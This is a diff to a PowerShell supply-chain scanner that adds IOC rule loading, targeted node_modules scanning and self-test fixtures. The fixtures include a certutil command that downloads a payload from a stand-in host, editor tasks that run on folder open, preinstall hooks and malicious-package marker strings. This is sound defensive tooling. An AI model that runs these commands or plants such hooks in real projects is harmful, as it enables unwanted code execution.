@@ -358,6 +358,21 @@ function Get-SupplyChainRules {
             }
         }
 
+        $v05RulesPath = Join-Path $PSScriptRoot "rules\v0.5\recent-supply-chain-rules.json"
+        if (Test-Path -LiteralPath $v05RulesPath -PathType Leaf) {
+            try {
+                $v05Rules = (Read-TextFile -Path $v05RulesPath) | ConvertFrom-Json
+                $mergedRuleSets = @()
+                $mergedRuleSets += (ConvertTo-Array $rules.rulesets)
+                $mergedRuleSets += (ConvertTo-Array $v05Rules.rulesets)
+                $rules.rulesets = $mergedRuleSets
+                [void]$loadMessages.Add("Supplemental v0.5 recent supply-chain IOC rules loaded.")
+            }
+            catch {
+                [void]$loadMessages.Add("Supplemental v0.5 recent supply-chain IOC rules could not be loaded.")
+            }
+        }
+
         $rules | Add-Member -NotePropertyName "loadStatus" -NotePropertyValue "loaded" -Force
         $rules | Add-Member -NotePropertyName "loadMessage" -NotePropertyValue ($loadMessages -join " ") -Force
         return $rules
@@ -631,7 +646,8 @@ function Test-SupplyCandidateFile {
     param(
         [System.IO.FileInfo]$File,
         [string]$RootPath,
-        [bool]$NodeModulesFullScan
+        [bool]$NodeModulesFullScan,
+        $Rules
     )
 
     $name = $File.Name
@@ -641,7 +657,21 @@ function Test-SupplyCandidateFile {
     $isNodeModules = Test-InNodeModules -Path $fullPath
 
     if ($isNodeModules -and -not $NodeModulesFullScan) {
-        return ($name -eq "package.json")
+        if ($name -eq "package.json") {
+            return $true
+        }
+        foreach ($ruleset in (ConvertTo-Array $Rules.rulesets)) {
+            foreach ($pattern in (ConvertTo-Array $ruleset.targetedNodeModulePathPatterns)) {
+                try {
+                    if ([System.Text.RegularExpressions.Regex]::IsMatch($fullPath, [string]$pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase, [TimeSpan]::FromSeconds(1))) {
+                        return $true
+                    }
+                }
+                catch {
+                }
+            }
+        }
+        return $false
     }
 
     if ($name -in @("package.json", "package-lock.json", "pnpm-lock.yaml", "yarn.lock", "bun.lock", "bun.lockb", ".npmrc")) {
@@ -1018,8 +1048,16 @@ function Add-PackageNameFindings {
 
     $exact = Get-PackageVersionRule -Rules $Rules -Name $Name -Version $Version
     if ($null -ne $exact) {
-        $recommendation = "Do not run install/build for this project. Confirm the source, clean the lockfile, and use patched version $($exact.patchedVersion) or later if applicable."
-        $Findings.Add((New-Finding -Severity "critical" -Category "known-malicious-package-version" -Path $Path -Line $Line -Match "$Name@$Version" -Message "Known affected TanStack package version matched." -Recommendation $recommendation))
+        $patchedVersion = [string]$exact.patchedVersion
+        $recommendation = "Do not run install/build for this project. Confirm the source and clean the lockfile."
+        if (-not [string]::IsNullOrWhiteSpace($patchedVersion)) {
+            $recommendation += " Use patched version $patchedVersion or later if applicable."
+        }
+        $message = [string]$exact.message
+        if ([string]::IsNullOrWhiteSpace($message)) {
+            $message = "Known affected package version matched."
+        }
+        $Findings.Add((New-Finding -Severity "critical" -Category "known-malicious-package-version" -Path $Path -Line $Line -Match "$Name@$Version" -Message $message -Recommendation $recommendation))
         return
     }
 
@@ -1863,7 +1901,7 @@ function Invoke-Scanner {
             }
             $isSupplyCandidate = $false
             if ($runSupplyChainScan) {
-                $isSupplyCandidate = Test-SupplyCandidateFile -File $child -RootPath (Resolve-Path -LiteralPath $rootPath).Path -NodeModulesFullScan $nodeModulesFullScan
+                $isSupplyCandidate = Test-SupplyCandidateFile -File $child -RootPath (Resolve-Path -LiteralPath $rootPath).Path -NodeModulesFullScan $nodeModulesFullScan -Rules $supplyRules
             }
             if (-not ($isInvisibleCandidate -or $isSupplyCandidate)) {
                 continue
@@ -2388,7 +2426,11 @@ if ($SelfTest) {
     $nestedWorkflowRoot = Join-Path $sampleRoot "vendor\sample-lib\.github\workflows"
     $extensionRoot = Join-Path $sampleRoot ".antigravity\extensions\sample.publisher-1.0.0"
     $nodeModulesPackageRoot = Join-Path $sampleRoot "node_modules\suspicious-package"
+    $keyvPackageRoot = Join-Path $sampleRoot "node_modules\keyv"
+    $asyncApiPackageRoot = Join-Path $sampleRoot "node_modules\@asyncapi\generator"
+    $joyfillPackageRoot = Join-Path $sampleRoot "node_modules\@joyfill\layouts\dist"
     $safePackageRoot = Join-Path $sampleRoot "safe-package"
+    $ordinaryPreinstallRoot = Join-Path $sampleRoot "ordinary-preinstall"
     New-Item -ItemType Directory -Force -Path $vscodeRoot | Out-Null
     New-Item -ItemType Directory -Force -Path $cursorRoot | Out-Null
     New-Item -ItemType Directory -Force -Path $cursorRulesRoot | Out-Null
@@ -2398,7 +2440,11 @@ if ($SelfTest) {
     New-Item -ItemType Directory -Force -Path $nestedWorkflowRoot | Out-Null
     New-Item -ItemType Directory -Force -Path $extensionRoot | Out-Null
     New-Item -ItemType Directory -Force -Path $nodeModulesPackageRoot | Out-Null
+    New-Item -ItemType Directory -Force -Path $keyvPackageRoot | Out-Null
+    New-Item -ItemType Directory -Force -Path $asyncApiPackageRoot | Out-Null
+    New-Item -ItemType Directory -Force -Path $joyfillPackageRoot | Out-Null
     New-Item -ItemType Directory -Force -Path $safePackageRoot | Out-Null
+    New-Item -ItemType Directory -Force -Path $ordinaryPreinstallRoot | Out-Null
     [System.IO.File]::WriteAllText((Join-Path $vscodeRoot "tasks.json"), '{"version":"2.0.0","tasks":[{"label":"open","type":"shell","runOptions":{"runOn":"folderOpen"},"command":"powershell -NoProfile"}]}', [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $cursorRoot "tasks.json"), '{"version":"2.0.0","tasks":[{"label":"install-root-modules","type":"shell","runOptions":{"runOn":"folderOpen"},"command":"npm install"}]}', [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $claudeRoot "settings.json"), '{"hooks":{"SessionStart":[{"command":"node -e console.log(1)"}]}}', [System.Text.Encoding]::UTF8)
@@ -2413,7 +2459,23 @@ if ($SelfTest) {
     [System.IO.File]::WriteAllText((Join-Path $sampleRoot ".npmrc"), "registry=https://filev2.getsession.org/", [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $extensionRoot "package.json"), '{"name":"sample-extension","scripts":{"prepare":"pwsh ./prepare.ps1"}}', [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $nodeModulesPackageRoot "package.json"), '{"name":"suspicious-package","scripts":{"postinstall":"node -e console.log(1)"}}', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path $keyvPackageRoot "package.json"), '{"name":"keyv","version":"6.0.0","scripts":{"preinstall":"node setup.mjs"}}', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path $keyvPackageRoot "setup.mjs"), 'const E = "Math_Symbol.js";', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path $asyncApiPackageRoot "package.json"), '{"name":"@asyncapi/generator","version":"3.3.1"}', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path $asyncApiPackageRoot "validator.js"), 'const marker = "miasma-train-p1";', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path (Split-Path $joyfillPackageRoot -Parent) "package.json"), '{"name":"@joyfill/layouts","version":"0.1.2-2773.beta.0"}', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path $joyfillPackageRoot "index.js"), 'const marker = "A9-0135-3";', [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $safePackageRoot "package.json"), '{"name":"safe-package","scripts":{"prepare":"husky install"}}', [System.Text.Encoding]::UTF8)
+    [System.IO.File]::WriteAllText((Join-Path $ordinaryPreinstallRoot "package.json"), '{"name":"ordinary-preinstall","scripts":{"preinstall":"node setup.mjs"}}', [System.Text.Encoding]::UTF8)
+    $selfTestRules = Get-SupplyChainRules
+    $targetedCandidates = @(
+        (Test-SupplyCandidateFile -File (Get-Item -LiteralPath (Join-Path $keyvPackageRoot "setup.mjs")) -RootPath $sampleRoot -NodeModulesFullScan $false -Rules $selfTestRules),
+        (Test-SupplyCandidateFile -File (Get-Item -LiteralPath (Join-Path $asyncApiPackageRoot "validator.js")) -RootPath $sampleRoot -NodeModulesFullScan $false -Rules $selfTestRules),
+        (Test-SupplyCandidateFile -File (Get-Item -LiteralPath (Join-Path $joyfillPackageRoot "index.js")) -RootPath $sampleRoot -NodeModulesFullScan $false -Rules $selfTestRules)
+    )
+    if (@($targetedCandidates | Where-Object { $_ }).Count -ne 3) {
+        throw "Self-test failed: v0.5 targeted dependency candidate selection did not include all confirmed package files."
+    }
     $toolsRoot = Join-Path $sampleRoot "tools"
     New-Item -ItemType Directory -Force -Path $toolsRoot | Out-Null
     [System.IO.File]::WriteAllText((Join-Path $toolsRoot "fetch.ps1"), 'certutil.exe -urlcache -split -f https://example.invalid/payload.txt payload.txt', [System.Text.Encoding]::UTF8)
@@ -2442,6 +2504,18 @@ if ($SelfTest) {
     $nodeModulesPackageHit = @($supplySelf.results | Where-Object { $_.path -like "*node_modules*" -and $_.category -eq "install-script-danger-term" }).Count
     if ($nodeModulesPackageHit -lt 1) {
         throw "Self-test failed: expected node_modules package.json lifecycle finding."
+    }
+    $knownRecentVersionHit = @($supplySelf.results | Where-Object { $_.category -eq "known-malicious-package-version" -and $_.match -in @("keyv@6.0.0", "@asyncapi/generator@3.3.1", "@joyfill/layouts@0.1.2-2773.beta.0") }).Count
+    if ($knownRecentVersionHit -lt 3) {
+        throw "Self-test failed: expected confirmed recent package version matches."
+    }
+    $targetedDependencyIocHit = @($supplySelf.results | Where-Object { $_.category -eq "known-ioc-string" -and $_.path -like "*node_modules*" -and $_.match -in @("Math_Symbol.js", "miasma-train-p1", "A9-0135-3") }).Count
+    if ($targetedDependencyIocHit -lt 3) {
+        throw "Self-test failed: expected IOC matches in targeted dependency source files without a full node_modules scan."
+    }
+    $ordinaryPreinstallHit = @($supplySelf.results | Where-Object { $_.category -eq "install-script-present" -and $_.severity -eq "medium" -and $_.path -like "*ordinary-preinstall*" }).Count
+    if ($ordinaryPreinstallHit -ne 1) {
+        throw "Self-test failed: an ordinary preinstall script must remain medium unless confirmed evidence is present."
     }
     New-Item -ItemType Directory -Force -Path (Join-Path $compoundRoot ".cursor") | Out-Null
     [System.IO.File]::WriteAllText((Join-Path $compoundRoot ".cursor\tasks.json"), '{"version":"2.0.0","tasks":[{"label":"install-root-modules","type":"shell","runOptions":{"runOn":"folderOpen"},"command":"npm i"}]}', [System.Text.Encoding]::UTF8)
